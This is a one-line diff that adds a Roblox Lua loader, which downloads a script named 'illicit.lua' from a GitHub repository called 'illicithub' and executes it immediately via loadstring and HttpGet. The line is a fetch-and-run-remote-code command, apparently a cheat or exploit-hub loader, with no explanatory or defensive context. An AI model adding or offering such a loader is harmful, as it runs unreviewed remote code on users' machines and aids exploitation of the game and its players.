@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vilesvpnz1/illicithub/refs/heads/main/illicit.lua"))()
